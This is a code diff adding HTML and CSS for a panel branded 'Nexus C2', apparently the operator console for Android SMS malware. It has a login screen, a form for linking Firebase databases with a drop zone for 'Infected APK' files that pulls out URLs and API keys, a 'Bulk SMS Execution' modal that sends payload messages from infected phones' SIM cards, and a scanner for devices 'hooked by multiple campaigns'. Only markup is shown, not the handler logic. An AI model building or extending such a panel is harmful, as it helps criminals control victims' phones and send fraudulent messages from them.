+                position: absolute; top: 60px; right: 12px; background: var(--bg-panel);
+                border: 1px solid var(--border); border-radius: var(--radius-md);
+                padding: 12px; flex-direction: column; gap: 8px;
+                box-shadow: var(--shadow-drop); display: none !important; z-index: 100;
+            }
+            .topbar-right.show { display: flex !important; }
+            .topbar-right .btn { width: 100%; justify-content: flex-start; }
+            
+            /* Stats pill shrinking */
+            .stat-pill { padding: 4px 8px; font-size: 0.7rem; }
+            
+            /* Tabs scrolling */
+            .tabs { 
+                overflow-x: auto; white-space: nowrap; padding: 0 16px; 
+                -webkit-overflow-scrolling: touch; flex-shrink: 0; 
+                scrollbar-width: none; /* Firefox */
+            }
+            .tabs::-webkit-scrollbar { display: none; /* Chrome/Safari */ }
+            .tab { padding: 12px 16px; flex-shrink: 0; }
+            
+            /* Stack grids */
+            .stats-grid { grid-template-columns: 1fr; }
+            .detail-grid { grid-template-columns: 1fr; }
+            
+            /* Message bubbles */
+            .msg { max-width: 95%; }
+            .pane { padding: 16px; }
+        }
+        .bulk-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 32px; }
+        .bulk-grid > div { min-width: 0; }
+        .bulk-left { border-right: 1px solid rgba(255,255,255,0.05); padding-right: 32px; }
+        
+        @media (max-width: 768px) {
+            .bulk-grid { grid-template-columns: 1fr; gap: 24px; }
+            .bulk-left { border-right: none; padding-right: 0; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 24px; }
+            .db-hide-mobile { display: none !important; }
+            .db-modal-inner { max-width: 600px !important; padding: 24px !important; }
+            .db-form-row-1, .db-form-row-2 { display: flex; flex-direction: column; gap: 12px; }
+            .db-form-row-1 > div, .db-form-row-2 > div { width: 100% !important; flex: unset !important; }
+            .db-form-row-2 button { width: 100%; margin-top: 4px; }
+            #dbList, #bulkDeviceList { min-height: unset !important; max-height: 200px !important; }
+        }
+        @media (min-width: 769px) {
+            .db-hide-pc { display: none !important; }
+            .db-modal-inner { max-width: 850px !important; padding: 24px 32px !important; }
+            .db-form-row-1, .db-form-row-2 { display: flex; flex-direction: column; gap: 16px; align-items: stretch; margin-bottom: 16px; }
+            .db-form-row-1 > div, .db-form-row-2 > div { width: 100% !important; flex: unset !important; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loading" id="loader" style="background: rgba(6,9,19,0.98); backdrop-filter: blur(20px); flex-direction: column; gap: 24px;">
+        <div style="position: relative; width: 80px; height: 80px; display: flex; justify-content: center; align-items: center;">
+            <div class="spinner" style="width: 100%; height: 100%; position: absolute; top: 0; left: 0;"></div>
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="z-index: 10; filter: drop-shadow(0 0 10px rgba(0,240,255,0.5));"><path d="M12 2v20"></path><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
+        </div>
+        <div style="font-family:var(--font-mono); color:var(--cyan); font-weight:700; font-size:1.2rem; letter-spacing: 2px; text-transform: uppercase;" id="loadText">Establishing Uplink...</div>
+        <div style="color:var(--text-muted); font-size: 0.85rem; letter-spacing: 1px;" id="loadSubtext">Connecting to Secure Nexus</div>
+    </div>
+
+    <!-- Single Login Portal Modal -->
+    <div class="modal-overlay" id="pwdModal" style="background: rgba(6,9,19,0.95); z-index: 10000; backdrop-filter: blur(16px);">
+        <div class="modal vault-modal" style="max-width: 440px; text-align: center; background: #0A101D; border: 1px solid #1f2937; box-shadow: inset 0 1px 0 rgba(255,255,255,0.05), 0 20px 60px rgba(0,0,0,0.8), 0 0 40px rgba(0,240,255,0.1); border-radius: 20px; padding: 40px 32px;">
+            <!-- Logo Area -->
+            <div style="display:flex; justify-content:center; align-items:center; gap: 12px; margin-bottom: 24px;">
+                <div style="width: 48px; height: 48px; border-radius: 12px; background: linear-gradient(180deg, #00d2ff, #0066ff); color: #000; font-weight: 900; font-size: 24px; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 20px rgba(0,102,255,0.4);">N</div>
+                <div style="text-align: left;">
+                    <div style="font-size: 1.8rem; font-weight: 900; letter-spacing: 2px; text-transform: uppercase; color: #fff; line-height: 1;">NEXUS</div>
+                    <div style="font-size: 0.8rem; font-weight: 700; color: var(--cyan); letter-spacing: 4px; text-transform: uppercase; margin-top: 4px;">V2 Proxy</div>
+                </div>
+            </div>
+
+            <div class="m-title" style="justify-content: center; font-size: 1.4rem; margin-bottom: 24px; font-weight: 800; letter-spacing: 0.5px; text-shadow: 0 0 20px rgba(255,255,255,0.1); display: flex; align-items: center; gap: 8px;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                Secure Authentication
+            </div>
+            
+            <div style="position: relative; margin-bottom: 16px;">
+                <input type="text" id="loginUsername" class="f-input" style="width: 100%; font-size: 1.1rem; padding: 14px 16px; background: #060913; border: 1px solid #1f2937; border-radius: 12px; box-shadow: inset 0 2px 10px rgba(0,0,0,0.5); transition: all 0.3s; color: #fff;" placeholder="Username" onfocus="this.style.borderColor='var(--cyan)'; this.style.boxShadow='inset 0 2px 10px rgba(0,0,0,0.5), 0 0 16px rgba(0,240,255,0.2)'" onblur="this.style.borderColor='#1f2937'; this.style.boxShadow='inset 0 2px 10px rgba(0,0,0,0.5)'">
+            </div>
+
+            <div style="position: relative; margin-bottom: 24px;">
+                <input type="password" id="masterPwd" class="f-input" style="width: 100%; font-size: 1.1rem; padding: 14px 16px; background: #060913; border: 1px solid #1f2937; border-radius: 12px; box-shadow: inset 0 2px 10px rgba(0,0,0,0.5); transition: all 0.3s; color: #fff;" placeholder="Password" onkeypress="if(event.key==='Enter') unlockVault()" onfocus="this.style.borderColor='var(--cyan)'; this.style.boxShadow='inset 0 2px 10px rgba(0,0,0,0.5), 0 0 16px rgba(0,240,255,0.2)'" onblur="this.style.borderColor='#1f2937'; this.style.boxShadow='inset 0 2px 10px rgba(0,0,0,0.5)'">
+            </div>
+            
+            <div id="loginError" style="color: var(--red); font-size: 0.9rem; margin-bottom: 16px; display: none;">Invalid credentials</div>
+
+            <button class="btn primary" id="loginBtn" style="width: 100%; justify-content: center; padding: 16px; font-size: 1.1rem; font-weight: 700; background: linear-gradient(135deg, var(--cyan), #0066ff); border: none; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,240,255,0.3); text-transform: uppercase; letter-spacing: 1px; color: #fff;" onclick="unlockVault()">Authenticate</button>
+        </div>
+    </div>
+
+    <!-- Custom Modals -->
+    <div class="modal-overlay" id="alertModal" style="z-index: 10005; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px);">
+        <div class="modal" style="background: #0A101D; border: 1px solid #1f2937; box-shadow: 0 20px 40px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.05); border-radius: 16px; padding: 24px 32px; max-width: 400px; text-align: center;">
+            <div style="margin: 0 auto 16px; width: 48px; height: 48px; background: rgba(0,240,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 1px solid rgba(0,240,255,0.2);">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+            </div>
+            <div class="m-title" id="alertTitle" style="justify-content: center; font-size: 1.4rem; margin-bottom: 12px; color: #fff;">Alert</div>
+            <div class="m-desc" id="alertDesc" style="color: var(--text-sec); line-height: 1.5; font-size: 0.95rem; margin-bottom: 24px;">...</div>
+            <div class="m-actions" style="justify-content: center;">
+                <button class="m-btn confirm" style="width: 100%; background: linear-gradient(135deg, var(--cyan), #00b3cc); color: #000; border: none; font-weight: 700; letter-spacing: 1px;" onclick="document.getElementById('alertModal').classList.remove('active')">Acknowledge</button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="modal-overlay" id="promptModal">
+        <div class="modal">
+            <div class="m-title" id="promptTitle">Prompt</div>
+            <div class="m-desc" id="promptDesc">...</div>
+            <input type="text" class="m-input" id="promptInput">
+            <div class="m-actions">
+                <button class="m-btn cancel" onclick="cancelPrompt()">Cancel</button>
+                <button class="m-btn confirm" onclick="submitPrompt()">Save</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="confirmModal" style="z-index: 10005;">
+        <div class="modal">
+            <div class="m-title" id="confirmTitle">Confirm</div>
+            <div class="m-desc" id="confirmDesc">...</div>
+            <div class="m-actions">
+                <button class="m-btn cancel" onclick="closeConfirm()">Cancel</button>
+                <button class="m-btn confirm" id="confirmOkBtn" style="background:var(--red);color:#fff;border:none">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Manage DBs Modal -->
+    <div class="modal-overlay" id="dbModal">
+        <div class="modal db-modal-inner">
+            <div class="m-title" style="display:flex;align-items:center;justify-content:space-between;gap:10px; margin-bottom: 24px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 16px;">
+                <div style="display:flex;align-items:center;gap:10px">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--cyan)"><ellipse cx="12" cy="5" rx="9" ry="3"></ellipse><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"></path><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"></path></svg>
+                    Manage Database Connections
+                </div>
+                <div style="display:flex;align-items:center;gap:12px">
+                    <div id="dbTotalBadge" style="font-size:0.75rem; background:rgba(0, 240, 255, 0.1); color:var(--cyan); padding:4px 10px; border-radius:12px; border:1px solid rgba(0,240,255,0.2); font-weight:700;">Total: 0</div>
+                    <button style="background:transparent; border:none; color:var(--text-muted); cursor:pointer; padding:4px; border-radius:50%; transition:var(--trans); display:flex; align-items:center; justify-content:center" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.color='#fff'" onmouseout="this.style.background='transparent';this.style.color='var(--text-muted)'" onclick="document.getElementById('dbModal').classList.remove('active')">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                    </button>
+                </div>
+            </div>
+            
+            <div class="bulk-grid" style="min-height: 0;">
+                <!-- LEFT COLUMN: EXISTING DATABASES -->
+                <div class="bulk-left" style="display: flex; flex-direction: column; min-width: 0; flex: 1;">
+                    <div style="font-size: 0.85rem; font-weight: 700; color: var(--text-sec); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 12px; flex-shrink: 0;">1. Connected Sources</div>
+                    <div id="dbList" style="flex: 1; min-height: 250px; max-height: 450px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; padding-right: 8px;">
+                        <!-- DB items injected here -->
+                    </div>
+                </div>
+
+                <!-- RIGHT COLUMN: ADD NEW DATABASE -->
+                <div style="display: flex; flex-direction: column; min-width: 0; flex: 1;">
+                    <div class="db-hide-mobile" style="font-size: 0.85rem; font-weight: 700; color: var(--text-sec); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center;">
+                        <span>2. Add New Source</span>
+                        <span style="font-size: 0.7rem; color: var(--cyan); background: rgba(0,240,255,0.1); padding: 2px 8px; border-radius: 10px;">APK EXTRACT SUPPORTED</span>
+                    </div>
+                    <div class="db-hide-pc" style="font-size: 0.85rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase; margin-bottom: 12px; letter-spacing: 1px;">Add New Source</div>
+                    
+                    <div id="apkDropZone" style="border: 2px dashed rgba(255,255,255,0.1); border-radius: var(--radius-md); padding: 20px; text-align: center; margin-bottom: 16px; cursor: pointer; transition: var(--trans); background: rgba(0,0,0,0.2); position: relative; overflow: hidden;" ondragover="this.style.borderColor='var(--cyan)'; this.style.background='rgba(0,240,255,0.05)'; event.preventDefault();" ondragleave="this.style.borderColor='rgba(255,255,255,0.1)'; this.style.background='rgba(0,0,0,0.2)';" ondrop="handleApkDrop(event)">
+                        <input type="file" id="apkFileInput" accept=".apk,.zip" style="position:absolute; top:0; left:0; width:100%; height:100%; opacity:0; cursor:pointer;" onchange="handleApkSelect(event)">
+                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 8px; opacity: 0.8;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
+                        <div id="apkDropText" style="font-size: 0.9rem; color: var(--text-sec); font-weight: 500;">Drop Infected APK Here</div>
+                        <div style="font-size: 0.75rem; color: var(--text-muted); margin-top: 4px;">Auto-extracts Firebase URL & API Key</div>
+                    </div>
+
+                    <div class="form-panel" style="flex: 1; background: rgba(0,0,0,0.15); border: 1px solid rgba(255,255,255,0.05); border-radius: var(--radius-md); padding: 16px; display: flex; flex-direction: column; gap: 12px;">
+                        <div class="db-form-row-1" style="display:flex; gap:10px;">
+                            <div class="f-group" style="margin-bottom:0; width:30%;">
+                                <label class="f-label db-hide-mobile">Source Label</label>
+                                <input type="text" id="newDbLabel" class="f-input" placeholder="Label (e.g. Rahul)" style="padding: 12px;">
+                            </div>
+                            <div class="f-group" style="margin-bottom:0; flex:1;">
+                                <label class="f-label db-hide-mobile">Firebase URL</label>
+                                <input type="text" id="newDbUrl" class="f-input" placeholder="URL (https://...)" style="padding: 12px;">
+                            </div>
+                        </div>
+                        <div class="db-form-row-2" style="display:flex; gap:10px; align-items:center;">
+                            <div class="f-group" style="margin-bottom:0; flex:1; display:flex; flex-direction:column;">
+                                <label class="f-label db-hide-mobile" style="display:flex; align-items:center; gap:6px;">
+                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--amber)"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                                    API Key (Optional)
+                                </label>
+                                <input type="text" id="newDbApiKey" class="f-input" placeholder="🔑 API Key (optional)" style="padding: 12px; background:rgba(0,0,0,0.2);">
+                            </div>
+                            <button class="m-btn confirm db-hide-pc" id="addDbBtnMobile" onclick="addDb()" style="padding: 12px 24px; min-width: 100px;">Add</button>
+                        </div>
+                    </div>
+                    
+                    <div class="m-actions db-hide-mobile" style="margin-top:20px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items:center;">
+                        <button class="m-btn cancel" style="min-width: 100px; padding: 12px; border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.03); color: var(--text-sec); transition: var(--trans);" onmouseover="this.style.background='rgba(255,255,255,0.08)';this.style.color='#fff'" onmouseout="this.style.background='rgba(255,255,255,0.03)';this.style.color='var(--text-sec)'" onclick="document.getElementById('dbModal').classList.remove('active')">Cancel</button>
+                        <button class="m-btn confirm" id="addDbBtn" style="background: linear-gradient(135deg, var(--cyan), #0284c7); color:#fff; border:none; padding: 12px 24px; display:flex; align-items:center; gap:8px;" onclick="addDb()">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"></line><line x1="5" y1="12" x2="19" y2="12"></line></svg>
+                            Connect Source
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="m-actions db-hide-pc" style="margin-top: 24px;">
+                <button class="m-btn cancel" onclick="document.getElementById('dbModal').classList.remove('active')">Close</button>
+                <button class="m-btn confirm" onclick="location.reload()" style="background: linear-gradient(135deg, var(--cyan), var(--purple)); border:none; color:#000;">Save & Sync</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bulk SMS Modal -->
+    <div class="modal-overlay" id="bulkSmsModal">
+        <div class="modal" style="max-width: 850px; padding: 24px 32px;">
+            <div class="m-title" style="display:flex;align-items:center;justify-content:space-between;gap:10px; margin-bottom: 24px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 16px;">
+                <div style="display:flex;align-items:center;gap:10px">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--purple)"><path d="M22 2L11 13"></path><path d="M22 2L15 22L11 13L2 9L22 2Z"></path></svg>
+                    Bulk SMS Execution
+                </div>
+                <button style="background:transparent; border:none; color:var(--text-muted); cursor:pointer; padding:4px; border-radius:50%; transition:var(--trans); display:flex; align-items:center; justify-content:center" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.color='#fff'" onmouseout="this.style.background='transparent';this.style.color='var(--text-muted)'" onclick="document.getElementById('bulkSmsModal').classList.remove('active')">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                </button>
+            </div>
+            
+            <div class="bulk-grid">
+                <!-- LEFT COLUMN: SELECTION -->
+                <div class="bulk-left" style="display: flex; flex-direction: column;">
+                    <div style="font-size: 0.85rem; font-weight: 700; color: var(--text-sec); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 12px;">1. Select Devices</div>
+                    <div class="bulk-ctrls" style="display:flex; flex-direction:column; gap:8px; margin-bottom: 16px;">
+                        <div class="filter-row" style="margin-bottom:0; display:flex; gap:8px;" id="bulkSrcFilters">
+                            <button class="f-btn active" onclick="setBF('src','all',this)" style="flex:1">All Sources</button>
+                            <!-- Source filters injected here -->
+                        </div>
+                        <div style="display:flex; flex-direction:column; gap:8px;">
+                            <div class="filter-row" style="margin-bottom:0; display:flex; gap:4px; padding:4px; background:rgba(0,0,0,0.2); border-radius:var(--radius-sm); border:1px solid var(--border);" id="filterEditBulk">
+                                <button class="f-btn f-purple active" onclick="setBF('edit','all',this)" style="flex:1; border:none; margin:0">All Nos</button>
+                                <button class="f-btn f-purple" onclick="setBF('edit','edited',this)" style="flex:1; border:none; margin:0">Edited</button>
+                                <button class="f-btn f-purple" onclick="setBF('edit','original',this)" style="flex:1; border:none; margin:0">Orig</button>
+                            </div>
+                            <div class="filter-row" style="margin-bottom:0; display:flex; gap:4px; padding:4px; background:rgba(0,0,0,0.2); border-radius:var(--radius-sm); border:1px solid var(--border);">
+                                <button class="f-btn f-amber active" onclick="setBF('stat','all',this)" style="flex:1; border:none; margin:0">All Stat</button>
+                                <button class="f-btn f-amber" onclick="setBF('stat','online',this)" style="flex:1; border:none; margin:0">Online</button>
+                                <button class="f-btn f-amber" onclick="setBF('stat','offline',this)" style="flex:1; border:none; margin:0">Offline</button>
+                            </div>
+                        </div>
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-top:12px; padding: 0;">
+                            <div style="font-weight:800; color:var(--cyan); font-size:1.1rem; letter-spacing:0.5px;" id="bulkCountDisplay">0 Selected</div>
+                            <div style="display:flex; gap:8px;">
+                                <button class="f-btn" style="border: 1px solid rgba(0, 240, 255, 0.3); color: var(--cyan); background: transparent; padding: 6px 14px;" onmouseover="this.style.background='rgba(0, 240, 255, 0.1)'" onmouseout="this.style.background='transparent'" onclick="bulkSelectAll()">Select All</button>
+                                <button class="f-btn" style="border: 1px solid rgba(236, 72, 153, 0.3); color: #ec4899; background: transparent; padding: 6px 14px;" onmouseover="this.style.background='rgba(236, 72, 153, 0.1)'" onmouseout="this.style.background='transparent'" onclick="bulkClear()">Clear</button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="bulk-list" id="bulkDeviceList" style="flex: 1; min-height: 250px; max-height: 350px; overflow-y:auto; padding-right:8px; border: 1px solid rgba(255,255,255,0.05); border-radius: var(--radius-md); background: rgba(0,0,0,0.1); padding: 8px;">
+                        <!-- Devices injected here -->
+                    </div>
+                </div>
+
+                <!-- RIGHT COLUMN: CONFIGURATION -->
+                <div style="display: flex; flex-direction: column;">
+                    <div style="font-size: 0.85rem; font-weight: 700; color: var(--text-sec); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 12px;">2. Configure Payload</div>
+                    <div class="form-panel" style="flex: 1; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: var(--radius-md); padding: 20px; display: flex; flex-direction: column; gap: 16px; box-shadow: inset 0 2px 10px rgba(0,0,0,0.2);">
+                        <div class="f-group" id="bulkReceiverGroup" style="display:none; margin-bottom: 0;">
+                            <label class="f-label" style="display:flex; align-items:center; gap:6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--cyan)"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                                Auto-Discovery Receiver ID (Optional)
+                            </label>
+                            <input type="text" class="f-input" id="bulkReceiverId" placeholder="Paste the ID of the device receiving replies..." style="background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.08); padding: 14px; font-size: 0.95rem;">
+                        </div>
+                        <div class="f-group" style="margin-bottom: 0;">
+                            <label class="f-label" style="display:flex; align-items:center; gap:6px;">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--amber)"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                                Target Phone Number
+                            </label>
+                            <input type="text" class="f-input" id="bulkSmsTo" placeholder="+91..." style="background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.08); padding: 14px; font-size: 1.05rem; letter-spacing: 1px;">
+                        </div>
+                        
+                        <div class="sim-grid" style="display:flex; gap:8px; margin-bottom:0; background:rgba(0,0,0,0.4); padding:8px; border-radius:var(--radius-sm); border:1px solid rgba(255,255,255,0.08);">
+                            <div class="sim-card active" id="bulkSim1Btn" style="flex:1; padding:12px; margin:0; border:none; border-radius:4px; box-shadow: 0 2px 8px rgba(0,0,0,0.2);" onclick="bulkSim=1;document.getElementById('bulkSim1Btn').classList.add('active');document.getElementById('bulkSim2Btn').classList.remove('active');">
+                                <div class="sim-title" style="margin:0; font-size:0.95rem; display:flex; align-items:center; justify-content:center; gap:8px;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--cyan)"><rect x="4" y="2" width="16" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg> SIM 1</div>
+                            </div>
+                            <div class="sim-card" id="bulkSim2Btn" style="flex:1; padding:12px; margin:0; border:none; border-radius:4px;" onclick="bulkSim=2;document.getElementById('bulkSim2Btn').classList.add('active');document.getElementById('bulkSim1Btn').classList.remove('active');">
+                                <div class="sim-title" style="margin:0; font-size:0.95rem; display:flex; align-items:center; justify-content:center; gap:8px;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--purple)"><rect x="4" y="2" width="16" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg> SIM 2</div>
+                            </div>
+                        </div>
+
+                        <div class="f-group" style="margin-bottom:0; flex:1; display:flex; flex-direction:column;">
+                            <label class="f-label" style="display:flex; align-items:center; justify-content:space-between;">
+                                <div style="display:flex; align-items:center; gap:6px;">
+                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--green)"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+                                    Payload Message
+                                </div>
+                                <span style="text-transform:none; color:var(--text-sec); font-size: 0.75rem; margin-right: 4px;">Uses <span style="color:var(--cyan);font-family:var(--font-mono);cursor:pointer;background:rgba(0,240,255,0.1);padding:2px 6px;border-radius:4px;border:1px solid rgba(0,240,255,0.3);transition:var(--trans);" onmouseover="this.style.background='rgba(0,240,255,0.2)'" onmouseout="this.style.background='rgba(0,240,255,0.1)'" onclick="navigator.clipboard.writeText('[ID]'); let t=this; t.innerText='Copied!'; t.style.background='var(--cyan)'; t.style.color='#000'; setTimeout(()=>{t.innerText='[ID]'; t.style.background='rgba(0,240,255,0.1)'; t.style.color='var(--cyan)'}, 1000)" title="Click to copy">[ID]</span></span>
+                            </label>
+                            <textarea class="f-input f-area" id="bulkSmsMsg" placeholder="Hi target, please call me back at this device ID: [ID]" style="flex:1; min-height: 120px; padding: 14px; resize:none; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.08); font-family: var(--font-sans); line-height: 1.5; color: #fff;"></textarea>
+                        </div>
+                    </div>
+                    
+                    <div class="m-actions" style="margin-top:20px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items:center;">
+                        <button class="m-btn cancel" style="min-width: 100px; padding: 12px; border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.03); color: var(--text-sec); transition: var(--trans);" onmouseover="this.style.background='rgba(255,255,255,0.08)';this.style.color='#fff'" onmouseout="this.style.background='rgba(255,255,255,0.03)';this.style.color='var(--text-sec)'" onclick="document.getElementById('bulkSmsModal').classList.remove('active')">Cancel</button>
+                        <button class="m-btn confirm" id="bulkExecBtn" style="background: linear-gradient(135deg, var(--purple), #ec4899); color:#fff; border:none; flex:1; margin-left:16px; padding: 12px; display:flex; justify-content:center; align-items:center; gap:8px; font-size: 1rem;" onclick="execBulkSMS()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2L11 13"></path><path d="M22 2L15 22L11 13L2 9L22 2Z"></path></svg>
+                            Launch Bulk Blast
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Duplicate Scanner Modal -->
+    <div class="modal-overlay" id="dupModal">
+        <div class="modal" style="max-width: 600px;">
+            <div class="m-title" style="display:flex;align-items:center;justify-content:space-between;gap:10px">
+                <div style="display:flex;align-items:center;gap:8px">🕵️ Duplicate Scanner</div>
+                <button style="background:transparent; border:none; color:var(--text-muted); cursor:pointer; padding:4px; border-radius:50%; transition:var(--trans); display:flex; align-items:center; justify-content:center" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.color='#fff'" onmouseout="this.style.background='transparent';this.style.color='var(--text-muted)'" onclick="document.getElementById('dupModal').classList.remove('active')">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                </button>
+            </div>
+            <div class="m-desc">Scanning across all attached databases for identical device IDs. This helps identify if the same physical device has been hooked by multiple campaigns.</div>
+            
+            <div id="dupList" style="margin-top: 20px; max-height: 400px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px;">
+                <!-- Duplicates injected here -->
+            </div>
+            
+            <div class="m-actions">
+                <button class="m-btn cancel" onclick="document.getElementById('dupModal').classList.remove('active')">Close Scanner</button>
+            </div>
+        </div>
+    </div>
+
+    <header class="topbar">
+        <div class="topbar-left">
+            <div class="logo">N</div>
+            <div class="brand">Nexus C2</div>
+            <div class="analytics-row">
+                <div style="display:flex; flex-direction:column; justify-content:center; gap: 4px;">
+                    <div style="font-size: 0.65rem; color: var(--text-sec); letter-spacing: 1px; text-transform: uppercase; font-weight: 600;">Total Devices</div>
+                    <div style="font-size: 1.2rem; font-weight: 700; color: #fff; line-height: 1; font-family: var(--font-mono);" id="hTotal">0</div>
+                </div>
+                <div style="width: 1px; height: 30px; background: rgba(255,255,255,0.08);"></div>
+                <div style="display:flex; flex-direction:column; justify-content:center; gap: 4px;">
+                    <div style="display:flex; align-items:center; gap:6px; font-size: 0.65rem; color: var(--text-sec); letter-spacing: 1px; text-transform: uppercase; font-weight: 600;">
+                        <div style="width:6px; height:6px; border-radius:50%; background:var(--cyan); box-shadow:0 0 8px var(--cyan);"></div> Online
+                    </div>
+                    <div style="font-size: 1.2rem; font-weight: 700; color: var(--cyan); line-height: 1; font-family: var(--font-mono);" id="hOnline">0</div>
+                </div>
+                <div style="width: 1px; height: 30px; background: rgba(255,255,255,0.08);"></div>
+                <div style="display:flex; flex-direction:column; justify-content:center; gap: 4px;">
+                    <div style="display:flex; align-items:center; gap:6px; font-size: 0.65rem; color: var(--text-sec); letter-spacing: 1px; text-transform: uppercase; font-weight: 600;">
+                        <div style="width:6px; height:6px; border-radius:50%; background:var(--red); box-shadow:0 0 8px var(--red);"></div> Offline
+                    </div>
